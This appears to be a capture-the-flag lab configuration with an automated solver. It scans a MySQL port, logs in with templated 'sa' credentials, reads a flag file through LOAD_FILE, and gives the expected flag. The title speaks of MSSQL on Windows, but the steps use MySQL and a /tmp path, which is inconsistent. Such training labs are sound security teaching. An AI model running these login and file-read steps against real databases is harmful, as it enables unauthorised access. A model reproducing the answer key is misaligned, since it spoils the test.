lab_id: windows-6-3-mssql-manual-authentication
track: Windows
difficulty: intermediate
source: platform/labs/Windows/windows-6-3-mssql-manual-authentication/lab.yaml
expected_services:
- port: 3306
  protocol: tcp
health_timeout_seconds: 60
solver:
  image: ocr-tester:latest
  command: /tests/windows-6-3-mssql-manual-authentication.sh
  steps:
  - name: Verify MySQL port 3306 is open
    command: nmap -Pn -p 3306 {target.target} | grep '3306/tcp'
    expect: open
  - name: Authenticate to MySQL with sa credentials
    command: mysql --ssl-verify-server-cert=0 -h {target.target} -u {cred.sa.user} -p{cred.sa.pass} -N -e 'SELECT CURRENT_USER()' 2>&1
    expect: sa@
  - name: Read flag file via LOAD_FILE
    command: mysql --ssl-verify-server-cert=0 -h {target.target} -u {cred.sa.user} -p{cred.sa.pass} -N -e "SELECT LOAD_FILE('/tmp/flag.txt')" 2>&1
    expect: OCR{
expected_flag_count: 1
expected_flag: OCR{mssql_m4nu4l_4uth}
forbidden_networks:
- control-plane
- database
- other-learners
max_memory_mb: 768
max_cpu: 0.75
